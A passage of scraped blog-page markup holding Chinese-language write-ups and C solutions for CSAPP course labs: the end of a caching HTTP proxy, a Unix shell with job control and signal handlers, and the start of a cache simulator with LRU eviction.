    return 0;
}

/*解析剩下的头部，构造并发送向后台服务器的请求,最后接受请求并返回给客户端*/
void request_back_server(rio_t *rio_buf, char *host, char *port, char *path, char *real_path)
{
    int fd_conn_back_server, fd_conn_client;
    char buf[MMAXLINE];

    fd_conn_client = rio_buf-&amp;gt;rio_fd;
    fd_conn_back_server = Open_clientfd(host, port);

    sprintf(buf, &amp;quot;GET %s HTTP/1.0
&amp;quot;, path);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;Host: %s:%s
&amp;quot;, host, port);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;User-Agent: %s
&amp;quot;, user_agent_hdr);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;Connection: close
&amp;quot;);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;Proxy-Connection: close
&amp;quot;);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));

    while (1)
    {
        Rio_readlineb(rio_buf, buf, MMAXLINE);
        if (!strcmp(buf, &amp;quot;
&amp;quot;))
        {
            Rio_writen(fd_conn_back_server, buf, strlen(buf));
            break;
        }
        deal_request_header(buf, fd_conn_back_server);
    }

    get_back_response_and_send_to_client(fd_conn_back_server, fd_conn_client, real_path);
    //Close(connfd);
    return;
}

/*处理请求头,忽略给定的头（需要修改的头）,并把其余头发送给后台服务器*/
void deal_request_header(char *header_line, int back_server_fd)
{
    char key[MMAXLINE], value[MMAXLINE];
    sscanf(header_line, &amp;quot;%s %s&amp;quot;, key, value);
    if (!strcmp(key, &amp;quot;Host:&amp;quot;))
        return;
    else if (!strcmp(key, &amp;quot;User-Agent:&amp;quot;))
    {
        return;
    }
    else if (!strcmp(key, &amp;quot;Connection:&amp;quot;))
    {
        return;
    }
    else if (!strcmp(key, &amp;quot;Proxy-Connection:&amp;quot;))
    {
        return;
    }
    else
    {
        Rio_writen(back_server_fd, header_line, strlen(header_line));
        return;
    }
}

/*读后台的返回，并且写给客户端*/
void get_back_response_and_send_to_client(int fd_conn_back_server, int client_fd, char *real_path)
{
    int body_length, body_length_record;
    ssize_t read_size;
    rio_t rio_buf;
    char buf[MMAXLINE], key[MMAXLINE], value[MMAXLINE];
    char *body_data, *temp_body_data_ptr, *temp_buf_ptr, *header_data;
    Rio_readinitb(&amp;amp;rio_buf, fd_conn_back_server);

    if ((header_data = (char *)malloc(MAXHEADER)) == NULL)
    {
        http_error(client_fd, &amp;quot;500&amp;quot;, &amp;quot;not enough memory&amp;quot;);
        return;
    }

    Rio_readlineb(&amp;amp;rio_buf, buf, MMAXLINE); //返回码
    Rio_writen(client_fd, buf, strlen(buf));
    sprintf(header_data, &amp;quot;%s&amp;quot;, buf);

    while (1)
    { /*读头部*/
        Rio_readlineb(&amp;amp;rio_buf, buf, MMAXLINE);
        if (!strcmp(buf, &amp;quot;
&amp;quot;))
        {
            Rio_writen(client_fd, buf, strlen(buf));
            break;
        }
        //deal_request_header(buf, fd_conn_back_server);
        sscanf(buf, &amp;quot;%s %s&amp;quot;, key, value);
        if (!strcmp(key, &amp;quot;Content-length:&amp;quot;))
        {
            body_length = atoi(value);
        }
        Rio_writen(client_fd, buf, strlen(buf));
        strcat(header_data, buf);
    }

    if (body_length &amp;gt; MAX_OBJECT_SIZE) //不能缓存
    {
        while (body_length &amp;gt; 0)
        {
            read_size = Rio_readnb(&amp;amp;rio_buf, buf, MMAXLINE);
            body_length -= read_size;
            Rio_writen(client_fd, buf, read_size);
        }
        free(header_data);
    }
    else //可以缓存
    {
        if ((body_data = (char *)malloc(body_length)) == NULL)
        {
            html_error(client_fd, &amp;quot;not enough memory&amp;quot;);
            //Close(client_fd);
            Close(fd_conn_back_server);
            return;
        }
        body_length_record = body_length;
        temp_body_data_ptr = body_data;
        while (body_length &amp;gt; 0)
        {
            read_size = Rio_readnb(&amp;amp;rio_buf, buf, MMAXLINE);
            body_length -= read_size;

            Rio_writen(client_fd, buf, read_size);

            temp_buf_ptr = buf; //写局部缓存
            while (read_size &amp;gt; 0)
            {
                *temp_body_data_ptr++ = *temp_buf_ptr++;
                read_size--;
            }
        }
        write_cache(header_data, body_data, body_length_record, real_path);
        free(header_data);
        free(body_data);
    }

    Close(fd_conn_back_server);
    //Rio_writen(client_fd, )
}
/*如函数名*/
void http_error(int fd, char *errnum, char *msg)
{
    char buf[MMAXLINE];

    /* Print the HTTP response headers */
    sprintf(buf, &amp;quot;HTTP/1.0 %s %s
&amp;quot;, errnum, msg);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;Content-type: text/html

&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));

    /* Print the HTTP response body */
    sprintf(buf, &amp;quot;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Request Error&amp;lt;/title&amp;gt;&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;body bgcolor=&amp;quot;
                 &amp;quot;ffffff&amp;quot;
                 &amp;quot;&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;%s: %s
&amp;quot;, errnum, msg);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;hr&amp;gt;&amp;lt;em&amp;gt;The Tiny Proxy server&amp;lt;/em&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
}

void html_error(int fd, char *msg)
{
    char buf[MMAXLINE];

    sprintf(buf, &amp;quot;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Request Error&amp;lt;/title&amp;gt;&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;body bgcolor=&amp;quot;
                 &amp;quot;ffffff&amp;quot;
                 &amp;quot;&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;%s
&amp;quot;, msg);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;hr&amp;gt;&amp;lt;em&amp;gt;The Tiny Proxy server&amp;lt;/em&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
}

void init_cache()
{
    memset(cache.block_slot, 0, MAXCACHEBLOCK * sizeof(struct cache_block *));
    cache.clock_p = 0;
    cache.used_block = 0;
    cache.used_size = 0;
    read_cnt = 0;
    sem_init(&amp;amp;mutex, 0, 1);
    sem_init(&amp;amp;write_lock, 0, 1);
}

/*找到返回body_size，并且写header与body，找不到返回-1*/
int read_cache(char *header, char *body, char *real_path)
{
    P(&amp;amp;mutex);
    if (++read_cnt == 1)
        P(&amp;amp;write_lock);
    V(&amp;amp;mutex);

    int i, find = 0;
    for (i = 0; i &amp;lt; MAXCACHEBLOCK; i++)
    {
        if (cache.block_slot[i] != NULL &amp;amp;&amp;amp; !strcmp(cache.block_slot[i]-&amp;gt;path, real_path))
        {
            find = 1;
            break;
        }
    }

    if (find)
    {
        struct cache_block *block = cache.block_slot[i];
        sprintf(header, &amp;quot;%s&amp;quot;, block-&amp;gt;header);
        memcpy(body, block-&amp;gt;body, block-&amp;gt;body_size);
        block-&amp;gt;visit = 1;
        find = block-&amp;gt;body_size;
    }
    else
        find = -1;

    P(&amp;amp;mutex);
    if (--read_cnt == 0)
        V(&amp;amp;write_lock);
    V(&amp;amp;mutex);

    return find;
}

/*成功返回1，失败返回0*/
int write_cache(char *header, char *body, int body_size, char *real_path)
{
    P(&amp;amp;write_lock);

    int slot;
    struct cache_block *block;

    slot = next_slot(body_size);
    block = cache.block_slot[slot] = (struct cache_block *)malloc(sizeof(struct cache_block));

    sprintf((block-&amp;gt;path), &amp;quot;%s&amp;quot;, real_path);
    sprintf((block-&amp;gt;header), &amp;quot;%s&amp;quot;, header);
    block-&amp;gt;visit = 1;
    block-&amp;gt;body_size = body_size;
    cache.used_block++;
    cache.used_size += body_size;
    if ((block-&amp;gt;body = (char *)malloc(body_size)) == NULL)
    {
        V(&amp;amp;write_lock);
        return 0;
    }
    memcpy(block-&amp;gt;body, body, body_size);
    V(&amp;amp;write_lock);
    return 1;
}

/*write已经获得了写锁，所以next_slot与evict都不用再加锁*/
int next_slot(int need_size)
{
    while (cache.used_size + need_size &amp;gt; MAX_CACHE_SIZE || cache.used_block &amp;gt;= MAXCACHEBLOCK)
        evict();
    while (cache.block_slot[cache.clock_p] != NULL)
        cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
    return cache.clock_p;
}

void evict()
{
    struct cache_block *block;
    while (1)
    {
        block = cache.block_slot[cache.clock_p];
        if (block == NULL)
        {
            cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
            continue;
        }
        if (block-&amp;gt;visit)
        {
            block-&amp;gt;visit = 0;
        }
        else
        {
            free(block-&amp;gt;body);
            cache.used_size -= block-&amp;gt;body_size;
            cache.used_block--;
            free(block);
            cache.block_slot[cache.clock_p] = NULL;
            return;
        }

        cache.clock_p = (cache.clock_p + 1) % MAXCACHEBLOCK;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;源文件&#34;&gt;源文件&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_proxylab.c&#34;&gt;proxy.c&lt;/a&gt;&lt;/p&gt;
">CSAPP：proxylab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_mhapqg/"" data-c="
          &lt;p&gt;这次的实验要求我们实现一个简化版的shell，需要能够实现子程序的前台与后台运行以及切换，同时实现几条内建命令。&lt;br&gt;
需要我们实现的内建命令包括以下4个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;quit： 退出shell&lt;/li&gt;
&lt;li&gt;jobs： 打印子进程列表与运行状态&lt;/li&gt;
&lt;li&gt;fg： 切换进程到前台运行&lt;/li&gt;
&lt;li&gt;bg： 切换进程到后台运行&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;eval&#34;&gt;&lt;code&gt;eval()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void eval(char *cmdline)
{
    char *argv[MAXARGS];
    char buf[MAXLINE];
    int bg;
    pid_t pid;
    sigset_t mask_one, mask_all, pre_mask;
    sigfillset(&amp;amp;mask_all);
    sigemptyset(&amp;amp;mask_one);
    sigaddset(&amp;amp;mask_one, SIGCHLD);
    strcpy(buf, cmdline);
    bg = parseline(buf, argv);
    if (argv[0] == NULL)
        return;
    if (!builtin_cmd(argv))
    {
        sigprocmask(SIG_BLOCK, &amp;amp;mask_one, &amp;amp;pre_mask);//阻断SIGCHLD
        if ((pid = fork()) == 0)
        {
            setpgid(0, 0); //*******很重要
            sigprocmask(SIG_SETMASK, &amp;amp;pre_mask, NULL);
            if (execve(argv[0], argv, environ) &amp;lt; 0)
            {
                printf(&amp;quot;%s: Command not found
&amp;quot;, argv[0]);
                exit(0);
            }
        }
        sigprocmask(SIG_BLOCK, &amp;amp;mask_all, NULL);//addjob涉及全局变量访问
        if (bg)
            addjob(jobs, pid, BG, buf);
        else
            addjob(jobs, pid, FG, buf);
        if (!bg)
            waitfg(pid);
        else
        {
            struct job_t *curr_bgmask = getjobpid(jobs, pid);
            printf(&amp;quot;[%d] (%d) %s&amp;quot;, curr_bgmask-&amp;gt;jid, curr_bgmask-&amp;gt;pid, curr_bgmask-&amp;gt;cmdline);
        }
        sigprocmask(SIG_SETMASK, &amp;amp;pre_mask, NULL);
    }
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个函数本身比较简单，书上的代码拿来改改就能用，但是有一个&lt;strong&gt;特别重要&lt;/strong&gt;的问题需要注意&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_d39d0b88e903b260fa9be52bc967f7be.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
大体意思就是在Unix shell上运行我们自己的shell时，需要在创建出一个子进程之后调用&lt;code&gt;setpgid(0, 0)&lt;/code&gt; 将他们放到一个新的进程组，否则我们的&lt;code&gt;ctrl-c&lt;/code&gt; 与&lt;code&gt;ctrl-z&lt;/code&gt; 会把信号发送到包括我们的shell在内的全部进程中，就是因为没注意这个使得我的shell产生的很多迷幻的错误，以至于调试很久却不知道原因（其实只能怪自己没认真看手册）。&lt;/p&gt;
&lt;h2 id=&#34;waitfg&#34;&gt;&lt;code&gt;waitfg()&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;对于waitfg()函数，我想过几个实行方案：&lt;/p&gt;
&lt;h3 id=&#34;waitfg1&#34;&gt;&lt;code&gt;waitfg1()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# This is a buggy code.
void waitfg(pid_t pid)
{
    int status;
    if (waitpid(pid,&amp;amp;status,0) &amp;lt; 0)
        unix_error(&amp;quot;waitfg: waitpid error
&amp;quot;);
    printf(&amp;quot;wait %d ok
&amp;quot;,pid);
    return;
}

void sigchld_handler(int sig)
{
    pid_t pid;  
    int old_errno = errno;
    while ((pid = waitpid(-1, NULL, 0)) &amp;gt; 0) //这里必须是while，书上讲的很明白了
	    printf(&amp;quot;Handler reaped child %d
&amp;quot;, (int)pid);
    if (errno != ECHILD)
	    unix_error(&amp;quot;waitpid error&amp;quot;);
    errno = old_errno;
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码是之前的，省略了一些不相关的细节。&lt;br&gt;
我们直接在&lt;code&gt;waitfg&lt;/code&gt;里面调用 &lt;code&gt;waitpid&lt;/code&gt; 函数，但是这样做有个很明显的问题，就是在回收后台进程时，如果在&lt;code&gt;sigchld_handler&lt;/code&gt; 函数的执行阶段前台进程结束了，会被一并回收掉，从而导致&lt;code&gt;waitfg&lt;/code&gt; 中的&lt;code&gt;waitpid&lt;/code&gt; 回收不到前台进程，从而产生一个错误。&lt;/p&gt;
&lt;h3 id=&#34;waitfg2&#34;&gt;&lt;code&gt;waitfg2()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# This is a buggy code.
void waitfg(pid_t pid)
{
    int status;
    sigset_t mask_chld,pre_mask;
    sigemptyset(&amp;amp;mask_chld);
    sigaddset(&amp;amp;mask_chld,SIGCHLD);
    sigprocmask(SIG_SETMASK,&amp;amp;mask_chld,&amp;amp;pre_mask);
    if (waitpid(pid,&amp;amp;status,0) &amp;lt; 0)
        unix_error(&amp;quot;waitfg: waitpid error
&amp;quot;);
    printf(&amp;quot;wait %d ok
&amp;quot;,pid);
    sigprocmask(SIG_SETMASK,&amp;amp;pre_mask,NULL);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;加入我们再waitfg中加入对SIGCHLD信号的阻塞，这样可以保证前台进程能被正确回收，但是问题在于我们执行前台进程时不会处理SIGCHLD信号，这样子进程就不能被回收，如果前台进程一直运行，就会导致后台进程退出后全部变成僵死进程，浪费系统资源。&lt;br&gt;
所以我们最终还是要按照书上的思路来实现&lt;/p&gt;
&lt;h3 id=&#34;waitfg-2&#34;&gt;&lt;code&gt;waitfg()&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void waitfg(pid_t pid)
{
    sigset_t mask_empty, mask_all, mask_pre;
    sigemptyset(&amp;amp;mask_empty);
    sigfillset(&amp;amp;mask_all);
    sigprocmask(SIG_SETMASK, &amp;amp;mask_all, &amp;amp;mask_pre); //fgpid涉及全局变量的访问
    while (pid == fgpid(jobs))
        sigsuspend(&amp;amp;mask_empty);
    sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;sigchld_handler&#34;&gt;&lt;code&gt;sigchld_handler()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void sigchld_handler(int sig)
{
    pid_t pid;
    int status;
    int old_errno = errno;
    sigset_t mask_empty, mask_all, mask_pre;
    sigemptyset(&amp;amp;mask_empty);
    sigfillset(&amp;amp;mask_all);
    while ((pid = waitpid(-1, &amp;amp;status, WNOHANG | WUNTRACED)) &amp;gt; 0)
    {
        sigprocmask(SIG_BLOCK, &amp;amp;mask_all, &amp;amp;mask_pre);
        if (WIFSTOPPED(status)) //暂停
        {
            struct job_t *job = getjobpid(jobs, pid);
            job-&amp;gt;state = ST;
            printf(&amp;quot;Job [%d] (%d) stopped by signal %d
&amp;quot;,job-&amp;gt;jid, pid, WSTOPSIG(status));
        }
        else
        {
            if (WIFSIGNALED(status)) //被信号退出
            {
                struct job_t *job = getjobpid(jobs, pid);
                printf(&amp;quot;Job [%d] (%d) terminated by signal %d
&amp;quot;, job-&amp;gt;jid, job-&amp;gt;pid, WTERMSIG(status));
            } 
            deletejob(jobs, pid);
        }
        sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
    }
    errno = old_errno;
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;有了前面的基础，这个函数也很简单了。&lt;/p&gt;
&lt;h2 id=&#34;sigint_handler-与-sigtstp_handler&#34;&gt;&lt;code&gt;sigint_handler() 与 sigtstp_handler()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void sigint_handler(int sig)
{
    pid_t pid;
    int old_errno = errno;
    if ((pid = fgpid(jobs)) != 0)
    {
        kill(-pid, SIGINT);
    }
    errno = old_errno;
    return;
}

void sigtstp_handler(int sig)
{
    pid_t pid;
    int old_errno = errno;
    pid = fgpid(jobs);
    if (pid)
    {
        kill(-pid, sig);
    }
    errno = old_errno;
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这两个也很简单&lt;/p&gt;
&lt;h2 id=&#34;builtin_cmd&#34;&gt;&lt;code&gt;builtin_cmd()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int builtin_cmd(char **argv)
{
    if (!strcmp(argv[0], &amp;quot;quit&amp;quot;))
        exit(0);
    else if (!strcmp(argv[0], &amp;quot;jobs&amp;quot;))
    {
        listjobs(jobs);
        return 1;
    }
    else if (!strcmp(argv[0], &amp;quot;bg&amp;quot;) || !strcmp(argv[0], &amp;quot;fg&amp;quot;))
    {
        do_bgfg(argv);
        return 1;
    }
    return 0; /* not a builtin command */
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个函数与书上的几乎无异。&lt;/p&gt;
&lt;h2 id=&#34;do_bgfg&#34;&gt;&lt;code&gt;do_bgfg()&lt;/code&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void do_bgfg(char **argv)
{
    struct job_t *job;
    if(argv[1] == NULL){
        printf(&amp;quot;%s command requires PID or %%jobid argument
&amp;quot;,argv[0]);
        return;
    }
    char * idstring = argv[1];
    int isjid = 0;
    int id;
    if(idstring[0]==&#39;%&#39;){   //以jobid作为目标
        isjid = 1;
        id = atoi(idstring+1);
        if(!id){
            printf(&amp;quot;%s: argument must be a PID or %%jobid
&amp;quot;,argv[0]);
            return;
        }
    }
    else{   //以pid作为目标
        id = atoi(idstring);
        if(!id){
            printf(&amp;quot;%s: argument must be a PID or %%jobid
&amp;quot;,argv[0]);
            return;
        }
    }
    sigset_t mask_empty, mask_all, mask_pre;
    sigemptyset(&amp;amp;mask_empty);
    sigfillset(&amp;amp;mask_all);
    sigprocmask(SIG_SETMASK, &amp;amp;mask_all, &amp;amp;mask_pre); //与job相关操作涉及全局变量的访问
    if (isjid)  //寻找目标job
    {
        job = getjobjid(jobs, id);
        if (!job){
            printf(&amp;quot;%%%d: No such job
&amp;quot;, id);
            sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
            return;
        }
    }
    else 
    {
        job = getjobpid(jobs, id);
        if (!job){
            printf(&amp;quot;(%d): No such process
&amp;quot;, id);
            sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
            return;
        }
    }
    pid_t pid = job-&amp;gt;pid;
    if (!strcmp(argv[0], &amp;quot;bg&amp;quot;)) //bg fg切换
    {
        job-&amp;gt;state = BG;
        printf(&amp;quot;[%d] (%d) %s&amp;quot;,job-&amp;gt;jid,job-&amp;gt;pid,job-&amp;gt;cmdline);
        kill(-pid, SIGCONT);
    }
    else if (!strcmp(argv[0], &amp;quot;fg&amp;quot;))
    {
        job-&amp;gt;state = FG;
        kill(-pid, SIGCONT);
        sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
        waitfg(pid);
        return;
    }
    sigprocmask(SIG_SETMASK, &amp;amp;mask_pre, NULL);
    return;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;主要是要对参数是否符合要求进行判断。&lt;/p&gt;
&lt;h2 id=&#34;完整代码&#34;&gt;完整代码&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://static.yulan.net.cn/image/csapp_shelllab.c&#34;&gt;tsh.c&lt;/a&gt;&lt;/p&gt;
">CSAPP: shelllab</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_mezrog/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://csapp.cs.cmu.edu/3e/cachelab.pdf&#34;&gt;实验手册&lt;/a&gt;：包含了实验指导和评分规则&lt;br&gt;
&lt;a href=&#34;http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf&#34;&gt;实验ppt&lt;/a&gt;对上课内容的回顾和对实验细节的讲解，很值得一看&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;part-a&#34;&gt;Part A&lt;/h2&gt;
&lt;p&gt;这一部分是要实现一个cache模拟器，需要记录命中次数，不命中次数和替换次数，通过这个可以让我们更加了解cache的运行方式，同时也可以更加了解LRU的替换策略。&lt;br&gt;
这一部分需要了解的两个函数&lt;code&gt;getopt()&lt;/code&gt; 和 &lt;code&gt;fscanf()&lt;/code&gt; 在开头的&lt;a href=&#34;http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf&#34;&gt;ppt&lt;/a&gt;中有讲解。&lt;/p&gt;
&lt;h3 id=&#34;先上代码&#34;&gt;先上代码&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;quot;cachelab.h&amp;quot;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
int h, v, s, S, E, b, B;    //定义全局变量方便调用
char t[200];
int hits, misses, evictions;
long stempnow = 0;
typedef struct
{
    int valid;  //有效位
    int tag;    //标记位
    long LRU_stemp; //LRU替换的标记
} cacheline, *cache_set, **_cache;
_cache cache;

//这一部分是为了实现-v下的回显，最终的测试并不要求这个
typedef int result_tag;
#define MISS 0
#define HIT 1
#define EVICTION 2


void printUsage();  //-h打印使用方法
void init_cache();  //初始化cache
void close_cache(); //free掉cache
void printverbose(char oper, unsigned int address, int size, char *opresult);  //-v下打印回显
void do_trace();  //解析trace并以此执行
result_tag access_cache(char oper, unsigned int address, int size); //访问cache

int main(int argc, char **argv)
{

    int opt;
    while (-1 != (opt = (getopt(argc, argv, &amp;quot;hvs:E:b:t:&amp;quot;))))
    {
        switch (opt)
        {
        case &#39;h&#39;:
            h = 1;
            printUsage();
            break;
        case &#39;v&#39;:
            v = 1;
            break;
        case &#39;s&#39;:
            s = atoi(optarg);
            break;
        case &#39;E&#39;:
            E = atoi(optarg);
            break;
        case &#39;b&#39;:
            b = atoi(optarg);
            break;
        case &#39;t&#39;:
            strcpy(t, optarg);
            break;
        default:
            printUsage();
            break;
        }
    }
    if (s &amp;lt;= 0 || E &amp;lt;= 0 || b &amp;lt;= 0 || t == NULL) // 如果选项参数不合格就退出
        return -1;
    S = 1 &amp;lt;&amp;lt; s;
    B = 1 &amp;lt;&amp;lt; b;
    init_cache();
    do_trace();
    close_cache();
    printSummary(hits, misses, evictions);
    return 0;
}

void printUsage()
{
    printf(&amp;quot;Usage: ./csim-ref [-hv] -s &amp;lt;num&amp;gt; -E &amp;lt;num&amp;gt; -b &amp;lt;num&amp;gt; -t &amp;lt;file&amp;gt;
&amp;quot;
           &amp;quot;Options:
&amp;quot;
           &amp;quot;  -h         Print this help message.
&amp;quot;
           &amp;quot;  -v         Optional verbose flag.
&amp;quot;
           &amp;quot;  -s &amp;lt;num&amp;gt;   Number of set index bits.
&amp;quot;
           &amp;quot;  -E &amp;lt;num&amp;gt;   Number of lines per set.
&amp;quot;
           &amp;quot;  -b &amp;lt;num&amp;gt;   Number of block offset bits.
&amp;quot;
           &amp;quot;  -t &amp;lt;file&amp;gt;  Trace file.

&amp;quot;
           &amp;quot;Examples:
&amp;quot;
           &amp;quot;  linux&amp;gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace
&amp;quot;
           &amp;quot;  linux&amp;gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace
&amp;quot;);
}

void init_cache()
{
    cache = (_cache)malloc(sizeof(cache_set) * S);
    int i, j;
    for (i = 0; i &amp;lt; S; i++)
    {
        cache[i] = (cache_set)malloc(sizeof(cacheline) * E);
        for (j = 0; j &amp;lt; E; j++)
        {
            cache[i][j].tag = 0;
            cache[i][j].valid = 0;
            cache[i][j].LRU_stemp = 0;
        }
    }
}

void close_cache()
{
    int i;
    for (i = 0; i &amp;lt; S; i++)
        free(cache[i]);
    free(cache);
}

void printverbose(char oper, unsigned int address, int size, char *opresult)
{
    printf(&amp;quot;%c %x,%d %s
&amp;quot;, oper, address, size, opresult);
}

void do_trace()
{
    FILE *fp = fopen(t, &amp;quot;r&amp;quot;); // 读取文件
    if (fp == NULL)
    {
        printf(&amp;quot;open error&amp;quot;);
        exit(-1);
    }

    char operation;       // 命令开头的 I L M S
    unsigned int address; // 地址参数
    int size;             // 大小
    while (fscanf(fp, &amp;quot; %c %xu,%d
&amp;quot;, &amp;amp;operation, &amp;amp;address, &amp;amp;size) &amp;gt; 0)
    {
        size = 1;
        result_tag r;
        switch (operation)
        {
        case &#39;I&#39;:
            break;
        case &#39;L&#39;:
            r = access_cache(operation, address, size);
            if (v)
            {
                if (r == HIT)
                    printverbose(operation, address, size, &amp;quot;hit&amp;quot;);
                else if (r == MISS)
                    printverbose(operation, address, size, &amp;quot;miss&amp;quot;);
                else if (r == EVICTION)
                    printverbose(operation, address, size, &amp;quot;miss eviction&amp;quot;);
            }
            break;
        case &#39;S&#39;:
            r = access_cache(operation, address, size);
            if (v)
            {
                if (r == HIT)
                    printverbose(operation, address, size, &amp;quot;hit&amp;quot;);
                else if (r == MISS)
                    printverbose(operation, address, size, &amp;quot;miss&amp;quot;);
                else if (r == EVICTION)
                    printverbose(operation, address, size, &amp;quot;miss eviction&amp;quot;);
            }
            break;
        case &#39;M&#39;:
            r = access_cache(operation, address, size);
            hits++;         //M的第二次一定命中
            if (v)
            {
                if (r == HIT)
                    printverbose(operation, address, size, &amp;quot;hit hit&amp;quot;);
                else if (r == MISS)
                    printverbose(operation, address, size, &amp;quot;miss hit&amp;quot;);
                else if (r == EVICTION)
                    printverbose(operation, address, size, &amp;quot;miss eviction hit&amp;quot;);
            }
            break;
        }
    }
    fclose(fp);
}

result_tag access_cache(char oper, unsigned int address, int size)
{
    int access_tag, access_set;
    int tag_mask, set_mask;
    set_mask = ((1 &amp;lt;&amp;lt; (b + s)) - 1) - ((1 &amp;lt;&amp;lt; b) - 1); //组号掩码
    access_set = ((set_mask &amp;amp; address) &amp;gt;&amp;gt; b) % S;     //组号
    tag_mask = -1 &amp;lt;&amp;lt; (b + s);                //tag的掩码
    access_tag = tag_mask &amp;amp; address;         //tag值 
    int i;
    for (i = 0; i &amp;lt; E; i++)
    {
        if (cache[access_set][i].valid &amp;amp;&amp;amp; cache[access_set][i].tag == access_tag) //命中
        {
            hits++;
            cache[access_set][i].LRU_stemp = stempnow++;
            return HIT;
        }
    }

    for (i = 0; i &amp;lt; E; i++)
    {
        if (!cache[access_set][i].valid) //未命中找到空行
        {
            cache[access_set][i].valid = 1;
            cache[access_set][i].tag = access_tag;
            cache[access_set][i].LRU_stemp = stempnow++;
            misses++;
            return MISS;
        }
    }

    //未命中且需要进行行替换
    //寻找时间戳最小（最少最近使用）的行
    int eviction_line = 0;
    long maxstemp = ~((long)1 &amp;lt;&amp;lt; 63);
    for (i = 0; i &amp;lt; E; i++)
    {
        if (cache[access_set][i].LRU_stemp &amp;lt; maxstemp)
        {
            eviction_line = i;
            maxstemp = cache[access_set][i].LRU_stemp;
        }
    }
    //行替换
    cache[access_set][eviction_line].valid = 1;
    cache[access_set][eviction_line].tag = access_tag;
    cache[access_set][eviction_line].LRU_stemp = stempnow++;
    misses++;
    evictions++;
    return EVICTION;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为了实现LRU的替换策略，我的方法是维持一个stempnow的自建时间戳，每次对行有更新时就讲这个时间戳记录进去，同时时间戳自加1，这样替换时就只需要寻找时间戳最小的那一行替换就行。&lt;br&gt;
这一部分总体上不难，主要困难在于理解cache的工作方式和设计如何去提取出组号与tag值。&lt;/p&gt;
&lt;h2 id=&#34;part-b&#34;&gt;Part B&lt;/h2&gt;
